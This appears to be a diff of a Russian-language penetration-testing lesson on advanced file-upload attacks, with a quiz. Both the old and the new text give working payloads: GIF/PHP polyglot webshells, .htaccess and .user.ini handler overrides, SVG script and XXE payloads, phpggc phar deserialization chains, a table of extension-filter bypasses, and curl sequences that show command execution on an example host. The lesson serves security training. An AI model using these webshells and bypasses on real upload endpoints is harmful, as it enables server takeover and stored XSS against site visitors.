@@ -15,51 +15,67 @@ estimated_minutes: 46
 summary: "Продвинутый обход загрузки файлов: полиглоты, .htaccess/.user.ini, SVG XSS/XXE, конфиги nginx, phar-десериализация."
 ---
 
-Базовая загрузка файла (`web-file-upload`) — это про обход расширений и MIME. Продвинутый уровень — про то, как **заставить сервер исполнить** загруженный контент там, где обычный `.php` не проходит: через полиглоты, `.htaccess`, SVG, конфиги nginx и phar-метаданные. Здесь меньше «угадывания расширения» и больше анализа, как сервер обрабатывает загруженное.
+## Вопрос, с которого всё начинается
 
-## Техника 1: полиглоты
+На базовом уроке мы обходили проверку расширения и MIME. Но современные загрузчики стали строже: белый список картинок, проверка **magic bytes** (первых байтов), иногда перекодирование изображения. Кажется, что залить код невозможно.
 
-Полиглот — файл, валидный сразу для двух форматов. Классика: GIF+PHP, где PHP-код спрятан в комментарии GIF, а заголовок `GIF89a` проходит проверку `getimagesize`/magic-bytes:
+Вопрос: как **заставить сервер исполнить** загруженный контент, если обычный `.php` не проходит? Ответ — в четырёх техниках: полиглоты, конфиги сервера, SVG и phar. Разберём их на одном примере.
 
-```php
-GIF89a
-<?php system($_GET['c']); ?>
-```
+## Наш пример
 
-Если фильтр проверяет только первые байты (magic), а сервер исполняет `.php` — полиглот проходит. Аналогично JPEG+PHP, PNG+PHP (с корректным размером чанков). Генерация:
+Есть сервис с аватарами `profile.example`. Заливаем обычную картинку — принимается. Пробуем `shell.php`:
 
 ```bash
-# GIF+PHP
-printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif.php
-# JPEG+PHP (через exiftool, комментарий)
-exiftool -Comment='<?php system($_GET["c"]); ?>' shell.jpg -o shell.jpg.php
+$ curl -s -F 'file=@shell.php' https://profile.example/upload
+{"error":"only images allowed (jpg/png)"}
+$ curl -s -F 'file=@shell.php;type=image/jpeg' https://profile.example/upload
+{"error":"not a valid image"}
 ```
 
-## Техника 2: .htaccess / .user.ini
+Второй отказ важен: сервер проверил **содержимое**, а не только заголовок. Значит, нужен файл, который действительно картинка — но при этом несёт наш код. Это и есть **полиглот**.
 
-Если загрузка разрешает файлы, начинающиеся с `.` (или обходит фильтр для них), можно **изменить поведение Apache**: заставить его исполнять `.jpg` как PHP.
+## Техника 1: полиглот (картинка + код)
 
-`.htaccess`:
+Полиглот — файл, валидный сразу для двух форматов. Классика — GIF+PHP: PHP-код прячется в конце, а заголовок `GIF89a` проходит проверку magic bytes:
+
+```bash
+$ printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif
+$ curl -s -F 'file=@shell.gif;type=image/gif' https://profile.example/upload
+{"url":"/uploads/shell.gif"}
+```
+
+Функция `getimagesize` видит `GIF89a` и пропускает файл. Осталось проверить, **исполняется** ли он:
+
+```bash
+$ curl -s 'https://profile.example/uploads/shell.gif?c=id'
+GIF89a
+```
+
+Сервер отдал `GIF89a` как текст — **не исполнил**. Полиглот прошёл проверку, но `.gif` не мапится на PHP. Значит, нужен второй приём — заставить сервер считать `.gif` скриптом.
+
+## Техника 2: `.htaccess` и `.user.ini`
+
+Если загрузчик принимает файлы, начинающиеся с точки, можно **изменить поведение сервера**. `.htaccess` — это конфиг Apache, который читается в каждой директории:
 
 ```apache
-AddType application/x-httpd-php .jpg
-# или
-<FilesMatch "\.jpg$">
-  SetHandler application/x-httpd-php
-</FilesMatch>
+AddType application/x-httpd-php .gif
 ```
 
-`.user.ini` (PHP-FPM/nginx):
+Загружаем `.htaccess`, затем наш `shell.gif`, затем вызываем:
 
-```ini
-auto_prepend_file=shell.jpg
+```bash
+$ printf 'AddType application/x-httpd-php .gif\n' > .htaccess
+$ curl -s -F 'file=@.htaccess' https://profile.example/upload
+$ curl -s -F 'file=@shell.gif' https://profile.example/upload
+$ curl -s 'https://profile.example/uploads/shell.gif?c=id'
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Шаги: загружаем `.htaccess`, затем `shell.jpg` с PHP-кодом, затем запрашиваем `shell.jpg` → исполняется.
+Теперь Apache считает `.gif` PHP-скриптом, и наш полиглот исполняется. Для PHP-FPM (nginx) аналог — `.user.ini` со строкой `auto_prepend_file=shell.gif`: он подключает наш файл перед каждым скриптом в директории.
 
-## Техника 3: SVG
+## Техника 3: SVG — картинка, которая исполняет
 
-SVG — это XML, который браузер исполняет; в нём можно встроить JS (stored XSS) и внешние сущности (XXE):
+SVG — это **векторная графика в формате XML**. Браузер её рендерит, а значит, встроенный `<script>` выполнится — это **stored XSS**:
 
 ```xml
 <svg xmlns="http://www.w3.org/2000/svg">
@@ -67,265 +83,102 @@ SVG — это XML, который браузер исполняет; в нём 
 </svg>
 ```
 
-Если SVG отдаётся с `Content-Type: image/svg+xml` и открывается напрямую — XSS. Внутри `<image href="...">` и `<!ENTITY>` — SSRF/XXE.
-
-## Техника 4: конфиги nginx
-
-Если загрузка кладёт файлы в каталог, который nginx конфигурирует, и можно влиять на конфиг (`/etc/nginx/conf.d/`), то `location` с `fastcgi_pass` может дать исполнение. Чаще встречается в CTF: загруженный `.conf` интерпретируется как конфиг. Проверяйте пути вроде `/etc/nginx/sites-enabled/`.
-
-## Техника 5: phar
-
-Phar-файл можно замаскировать под картинку (stub `GIF89a`), а внутри — метаданные с POP-цепочкой. При обращении к `phar://` (через любую файловую функцию) метаданные десериализуются → RCE (см. `web-php-deser-chains`, `web-php-tricks`):
-
 ```bash
-./phpggc -p phar -o shell.jpg Monolog/RCE1 system id
+$ curl -s -F 'file=@evil.svg;type=image/svg+xml' https://profile.example/avatar
+{"url":"/uploads/evil.svg"}
 ```
 
-Расширение неважно — важно, что файл валидный phar.
+Если SVG отдаётся с `Content-Type: image/svg+xml` и открывается напрямую — чужой браузер исполнит скрипт. А поскольку SVG — XML, туда же помещается внешняя сущность (XXE) и `href` на внутренний URL (SSRF). Загрузка картинки превращается в атаку на тех, кто её смотрит.
 
-## Техника 6: обход фильтров
+## Техника 4: phar — десериализация через загруженный файл
 
-- **Двойное расширение:** `shell.php.jpg`, `shell.jpg.php`.
-- **Регистр:** `shell.PHP`, `shell.PhP`.
-- **Trailing-символы:** `shell.php%00.jpg` (null byte, старые), `shell.php.` (точка), `shell.php ` (пробел), `shell.php::$DATA` (NTFS ADS).
-- **Спецсимволы:** `shell.php/.`, `shell.php\x00`.
-- **Content-Type:** подмена на `image/jpeg` при `Content-Type`-проверке.
-- **Двойное кодирование:** `shell%252ephp`.
-- **Архив:** загрузка zip, внутри — `.php` (см. `web-zip-slip`).
-
-## Разобранный пример: .htaccess → RCE
-
-Шаг 1 — загружаем `.htaccess`:
+Phar-архив можно замаскировать под картинку (stub `GIF89a`), а внутри положить **метаданные с POP-цепочкой**. При обращении к `phar://` (через любую файловую функцию) метаданные десериализуются → RCE:
 
 ```bash
-printf 'AddType application/x-httpd-php .jpg\n' > .htaccess
-curl -s -F "file=@.htaccess" https://app.example/upload
+$ ./phpggc -p phar -o shell.jpg Monolog/RCE1 system id
+$ curl -s -F 'file=@shell.jpg;type=image/jpeg' https://profile.example/upload
+$ curl -s "https://profile.example/avatar?src=phar://uploads/shell.jpg/x"
 ```
 
-Шаг 2 — загружаем картинку с PHP:
+Расширение неважно — важно, что файл валидный phar. Так «загрузка картинки + любое чтение по управляемому пути» становится RCE (см. `web-php-deser-chains`).
 
-```bash
-printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.jpg
-curl -s -F "file=@shell.jpg;type=image/jpeg" https://app.example/upload
-```
+## Техника 5: обход фильтров расширений
 
-Шаг 3 — исполняем:
-
-```bash
-curl -s "https://app.example/uploads/shell.jpg?c=id"
-```
-
-## Разобранный пример: SVG XSS
-
-```bash
-curl -s -F "file=@evil.svg;type=image/svg+xml" https://app.example/avatar
-# evil.svg: <svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
-curl -s "https://app.example/uploads/evil.svg"   # откроется в браузере -> XSS
-```
-
-## Что проверять
-
-- Куда попадает файл (URL после загрузки) и исполняется ли он.
-- Разрешённые расширения/типы; как проверяется (magic, расширение, MIME).
-- Можно ли загрузить `.htaccess`/`.user.ini`/`.svg`/`.phar`-совместимый.
-- Отдаётся ли загруженное с опасным `Content-Type`.
-
-## Инструменты
-
-- **Burp Intruder** — перебор расширений/обходов.
-- **`exiftool`** — вставка PHP в метаданные JPEG.
-- **`phpggc -p phar`** — phar-payload.
-- **`ffuf`** — поиск каталога загрузок (см. `web-tool-ffuf`).
-- **`Gifsicle`/`ImageMagick`** — валидные полиглоты.
-
-## Что дальше / decision
-
-1. Загрузка разрешена → определите, исполняется ли загруженное.
-2. Обычный `.php` блокируется → `.htaccess`/`.user.ini`, полиглот.
-3. Разрешён SVG → XSS/XXE.
-4. Есть LFI/файловые функции → `phar://`-триггер.
-5. RCE → устойчивый канал + read-back.
-
-## Частые ошибки
-
-- **Проверять только расширение.** Magic/MIME тоже проверяются — нужен полиглот.
-- **Забыть про `.htaccess`.** Он превращает картинку в PHP.
-- **Игнорировать SVG.** Это XML с JS/XXE.
-- **Путать phar и обычный архив.** Phar триггерит десериализацию.
-- **Ломать прод.** Загрузка webshell — только с согласия.
-
-## Обход фильтров загрузки: полная таблица
-
-Фильтры загрузки проверяют расширение, MIME, магические байты, размер, содержимое. Каждому — свой обход.
+Если до `.htaccess` дело не дошло, попробуй обойти саму проверку расширения:
 
 | Фильтр | Обход |
 |--------|-------|
-| Чёрный список `.php` | `.phtml`, `.php5`, `.phar`, `.pht`, `.php7` |
-| Белый список картинок | polyglot GIF/PHP, `exif`-инъекция |
-| `Content-Type` | подменить заголовок на `image/png` |
-| Magic bytes | добавить `GIF89a;` в начало |
+| Чёрный список `.php` | `.phtml`, `.php5`, `.pht`, `.phar` |
+| Белый список картинок | полиглот + `.htaccess`/`.user.ini` |
+| `Content-Type` | подменить на `image/jpeg` |
+| Magic bytes | `GIF89a;` в начале |
 | Двойное расширение | `shell.php.jpg`, `shell.jpg.php` |
-| Null byte | `shell.php%00.jpg` (старые версии) |
 | Регистр | `shell.PHP`, `shell.pHp` |
 | Trailing dot/space | `shell.php.`, `shell.php ` |
-| Проверка размера | polyglot минимального размера |
+| Null byte | `shell.php%00.jpg` (старые версии) |
 
-```bash
-# обход magic bytes + Content-Type
-printf 'GIF89a;<?php system($_GET["c"]); ?>' > shell.gif
-curl -s -F 'file=@shell.gif;type=image/gif' https://app.example/upload
-# вызов
-curl -s 'https://app.example/uploads/shell.gif?c=id'
-```
+## Техника 6: конфиг nginx
 
-## Полиглоты: как собрать рабочий файл
-
-Полиглот — файл, валидный и как изображение, и как скрипт.
-
-```bash
-# 1) GIF/PHP: минимальный GIF-заголовок + PHP
-printf 'GIF89a<?php system($_GET[0]); ?>' > p.gif
-# 2) JPEG/PHP через exif-комментарий
-exiftool -Comment='<?php system($_GET[0]); ?>' img.jpg -o shell.jpg
-# 3) ZIP/PHP (phar) — см. ниже
-# 4) SVG/PHP не сработает как PHP, но как XSS — да
-```
-
-```php
-// phar: PHP-код внутри ZIP/JPG, исполняется через phar://
-// создаём архив с файлом evil.php и обращаемся phar://uploads/x.zip/evil
-```
-
-## .htaccess и .user.ini: включение исполнения
-
-Если можно загрузить `.htaccess` (Apache) — можно «научить» сервер исполнять картинки как PHP.
-
-```apache
-# .htaccess: исполнять .gif как PHP
-AddType application/x-httpd-php .gif
-# или переопределить handler
-<FilesMatch ".gif$">
-  SetHandler application/x-httpd-php
-</FilesMatch>
-```
-
-```bash
-curl -s -F 'file=@.htaccess' https://app.example/upload
-curl -s -F 'file=@shell.gif' https://app.example/upload
-curl -s 'https://app.example/uploads/shell.gif?c=id'
-```
-
-`.user.ini` (PHP-FPM) задаёт `auto_prepend_file` — можно подключать свой файл.
-
-## nginx и конфиги: опасные директивы
+В nginx нет `.htaccess`, но опасен сам конфиг. Если загруженный `.php` попадает в директорию, которую «достаёт» PHP-локейшен, он исполняется:
 
 ```nginx
-# уязвимая конфигурация: загрузка в директорию с PHP-локейшеном
-location /uploads/ { root /var/www; }      # .php в uploads не исполняется -> ок
-location ~ \.php$ { fastcgi_pass ...; }    # но это правило может «дотянуться» до uploads
+location /uploads/ { root /var/www; }
+location ~ \.php$ { fastcgi_pass ...; }   # это правило может дотянуться до uploads
 ```
 
+Проверка — прямая:
+
 ```bash
-# проверка: загружаем .php в /uploads и пробуем вызвать
-curl -s -F 'file=@shell.php' https://app.example/upload
-curl -s 'https://app.example/uploads/shell.php?c=id'
+$ curl -s -F 'file=@shell.php' https://profile.example/upload
+$ curl -s 'https://profile.example/uploads/shell.php?c=id'
 # если 200 и вывод id -> конфиг опасен
 ```
 
-## Разобранный пример: .htaccess → RCE
+## Порядок проверки загрузчика
 
-```text
-1) загружаем .htaccess с AddType ... .gif
-2) загружаем shell.gif (GIF89a + PHP)
-3) вызываем shell.gif?c=id
-4) получаем RCE
-```
+Чтобы не тратить запросы вслепую, иди по шагам и фиксируй ответ на каждом:
 
-```bash
-# всё одной серией
-curl -s -F 'file=@.htaccess' https://app.example/upload
-curl -s -F 'file=@shell.gif' https://app.example/upload
-curl -s 'https://app.example/uploads/shell.gif?c=id'
-```
-
-## Инструменты
-
-| Инструмент | Назначение |
-|-----------|-----------|
-| `exiftool` | инъекция в метаданные |
-| `ffuf` | перебор расширений |
-| `Burp` | подмена Content-Type |
-| `weevely` | генерация webshell |
-| `nuclei` | шаблоны upload |
-
-```bash
-ffuf -u https://app.example/upload -X POST -F 'file=@shell.FUZZ' \
-  -w exts.txt -mr 'success|uploaded'
-```
-
-## Что делать дальше / решение
-
-1. **Определите фильтр.** Расширение, MIME, magic, содержимое.
-2. **Подберите обход.** Таблица выше.
-3. **Проверьте исполнение.** Доступен ли загруженный файл и исполняется ли.
-4. **Используйте .htaccess/.user.ini.** Если директория их принимает.
-5. **Проверьте nginx-конфиг.** Исполняется ли `.php` в uploads.
-6. **Зафиксируйте PoC.** Вывод `id` через загруженный файл.
-
-## Практика и справочники
-
-- **PortSwigger Academy** — «File upload vulnerabilities».
-- **HackTricks** — «File Upload».
-- **PayloadsAllTheThings** — «Upload Insecure Files».
-- **web-upload-rce** — класс-скилл.
-
-## Приоритеты при загрузке файлов
-
-Начните с определения фильтра: расширение, MIME, magic bytes, содержимое. Затем подберите обход из таблицы (альтернативные расширения, двойное расширение, подмена `Content-Type`, polyglot с магическими байтами). Ключевой вопрос — **исполняется ли** загруженный файл и доступен ли он по URL. Если директория принимает `.htaccess`/`.user.ini`, загрузка становится RCE напрямую. Проверяйте также, исполняется ли `.php` в директории uploads (частая ошибка конфига nginx).
-
-## Кратко
-
-1. Определите фильтр.
-2. Подберите обход (таблица).
-3. Проверьте доступность и исполнение файла.
-4. Используйте `.htaccess`/`.user.ini`.
-5. Проверьте nginx-конфиг.
-6. PoC — вывод `id`.
-
-## Практика
-
-- **PortSwigger Academy** — file upload.
-- **HackTricks** — File Upload.
-- **PayloadsAllTheThings** — Upload Insecure Files.
-
-## Расширенный разбор: что проверять в первую очередь
-
-| Шаг | Проверка | Признак |
-|-----|----------|---------|
-| 1 | расширения | какие принимаются |
-| 2 | MIME/magic | проверяются ли реально |
-| 3 | доступность файла | отдаётся ли по URL |
-| 4 | исполнение | `.php`/`.phtml`/`.gif` |
-| 5 | `.htaccess` | принимается ли |
-| 6 | директория | uploads/static |
+| Шаг | Что проверяем | Признак |
+|-----|---------------|---------|
+| 1 | какие расширения принимаются | ответ `ok`/`error` |
+| 2 | проверяется ли содержимое | `not a valid image` |
+| 3 | доступен ли файл по URL | `curl` отдаёт содержимое |
+| 4 | исполняется ли файл | вывод команды вместо текста |
+| 5 | принимается ли `.htaccess`/`.user.ini` | файл загрузился |
+| 6 | куда попадает файл | путь в ответе `/uploads/...` |
 
 ```bash
 # минимальная серия проверок
-curl -s -F 'file=@test.php' https://app.example/upload
-curl -s -F 'file=@test.php.jpg' https://app.example/upload
-curl -s -F 'file=@test.jpg;type=application/x-php' https://app.example/upload
-curl -s -o /dev/null -w '%{http_code}\n' https://app.example/uploads/test.php
+$ curl -s -F 'file=@test.jpg' https://profile.example/upload
+$ curl -s -F 'file=@test.php' https://profile.example/upload
+$ curl -s -F 'file=@test.php.jpg' https://profile.example/upload
+$ curl -s -F 'file=@test.jpg;type=application/x-php' https://profile.example/upload
 ```
 
-## Дополнительно: webshell
+Ключевой вопрос — **шаг 4**. Загрузка сама по себе ничего не доказывает: нужен запрос к загруженному файлу, который вернёт вывод команды. Пока этого нет, находка остаётся «suspected», а не «RCE». И помни про гигиену: перед запуском скачанного PoC или чужого `.htaccess` прочитай его — это недоверенный контент.
 
-Для эксплуатации удобен минимальный webshell: `<?php system($_GET['c']); ?>`. Обфусцированные варианты (`<?=` с backticks, base64) помогают обойти фильтры содержимого. Не забывайте про размер: некоторые загрузчики требуют валидное изображение — тогда используйте polyglot с настоящими пиксельными данными.
+## Что мы теперь знаем
 
-## Ещё одна проверка
+- Строгий загрузчик проверяет **содержимое** (magic bytes), не только имя и заголовок.
+- **Полиглот** — файл, валидный и как картинка, и как код.
+- **`.htaccess`/`.user.ini`** меняют обработку расширений → полиглот исполняется.
+- **SVG** — XML: даёт stored XSS, XXE и SSRF.
+- **phar** под картинкой триггерит десериализацию через `phar://`.
+- Обходы расширений: альтернативные, двойные, регистр, trailing-символы.
+- Артефакт — `uid=33(www-data)` из загруженного файла, а не «файл загрузился».
 
-Отдельно проверьте загрузку **конфигурационных** файлов: `.htaccess`, `.user.ini`, `web.config`, `.conf`. Если они принимаются, это часто прямее, чем подбор расширения: вы меняете поведение сервера и включаете исполнение для уже загруженных «безобидных» файлов. В nginx-сценариях ищите, попадает ли директория uploads под PHP-локейшен.
+## На что смотреть дальше
+
+- **Ключевой вопрос — исполняется ли файл**, а не «прошла ли загрузка». Всегда вызывай загруженный файл.
+- **Если директория принимает `.htaccess`/`.user.ini`** — это часто прямее, чем подбор расширения.
+- **Проверь nginx:** попадает ли uploads под PHP-локейшен.
+- **Не игнорируй SVG** — даже без RCE он даёт XSS на всех, кто откроет картинку.
+- **phar** связывает загрузку с десериализацией — проверь файловые функции с параметром-путём.
+- **Только с согласия.** Заливка webshell — изменение прода.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что такое полиглот-файл?"
@@ -335,40 +188,44 @@ curl -s -o /dev/null -w '%{http_code}\n' https://app.example/uploads/test.php
     - "Шифр"
     - "Cookie"
   answer: 1
-  explanation: "Обходит проверку 'это картинка'."
-- question: "Что делает .htaccess с AddType?"
+  explanation: "Он проходит проверку содержимого 'это картинка', но несёт код."
+- question: "Что делает `.htaccess` со строкой `AddType application/x-httpd-php .gif`?"
   options:
-    - "Сжимает"
-    - "Заставляет сервер исполнять .jpg как PHP"
-    - "Шифрует"
-    - "Кеширует"
+    - "Сжимает вывод"
+    - "Заставляет Apache исполнять `.gif` как PHP"
+    - "Шифрует файлы"
+    - "Кеширует страницу"
   answer: 1
-  explanation: "Меняет обработку расширений."
-- question: "Что задаёт .user.ini?"
+  explanation: "Конфиг меняет обработку расширений в директории."
+- question: "Что задаёт `.user.ini` в PHP-FPM?"
   options:
-    - "TLS"
-    - "auto_prepend_file — подключает файл перед каждым PHP-скриптом"
-    - "DNS"
+    - "TLS-сертификат"
+    - "`auto_prepend_file` — подключает файл перед каждым скриптом"
+    - "DNS-сервер"
     - "Cookie"
   answer: 1
-  explanation: "Триггерит подключение загруженного файла."
+  explanation: "Триггерит подключение загруженного файла к каждому запросу."
 - question: "Чем опасен загружаемый SVG?"
   options:
-    - "Он большой"
-    - "SVG — XML: возможен XSS и XXE"
-    - "Он шифрует"
+    - "Он большой по размеру"
+    - "SVG — это XML: возможен stored XSS, XXE и SSRF"
+    - "Он шифрует данные"
     - "Он кешируется"
   answer: 1
-  explanation: "XML-контекст в браузере/парсере."
-- question: "Как связан upload и phar?"
+  explanation: "XML-контекст даёт выполнение JS и обработку внешних сущностей."
+- question: "Как связаны upload и phar?"
   options:
     - "Никак"
-    - "Загруженный phar триггерит десериализацию через phar://"
+    - "Загруженный phar триггерит десериализацию при обращении к `phar://`"
     - "Через TLS"
     - "Через DNS"
   answer: 1
-  explanation: "Метаданные phar десериализуются."
+  explanation: "Метаданные phar десериализуются — цепочка POP → RCE."
 ```
+
+## Куда дальше
+
+Дальше мы разберём инъекции уже не в PHP/шаблоны, а в **сам Node.js** — где опасны шаблонизаторы EJS/Pug и прямые вызовы `child_process` (`web-nodejs-injection`). А пока главное запомни: продвинутая загрузка — это **не про расширение, а про то, как сервер обрабатывает загруженное**.
 
 ## Где пригодится
 
